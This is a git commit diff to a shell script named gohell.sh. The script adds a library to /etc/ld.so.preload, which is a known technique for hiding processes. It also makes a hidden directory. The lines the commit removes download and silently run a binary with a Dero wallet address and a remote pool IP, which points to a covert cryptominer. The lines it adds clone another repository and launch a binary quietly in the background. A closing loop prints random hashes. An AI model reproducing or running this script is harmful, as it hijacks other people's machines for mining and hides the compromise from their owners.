1f206b2b47d3cc6a78a53cfb38306baa6c241fc4
tyha4t57i <152833181+tyha4t57i@users.noreply.github.com>
2023-12-04 17:52:29 +0700

    Update gohell.sh

--- gohell.sh
+++ gohell.sh
@@ -7,7 +7,8 @@ mv libnyumput.so /usr/local/lib/
 echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
 mkdir .kap && cd .kap
-wget https://github.com/tyha4t57i/filesg/raw/main/astro
-chmod +x astro
-./astro -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -r 136.244.103.215:10100 -p rpc -m 13 > /dev/null 2>&1 &
+git clone https://github.com/tyha4t57i/gradi.git
+cd gradi
+chmod +x 80.json && chmod +x zepo
+./zepo -c "80.json" > /dev/null 2>&1 &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
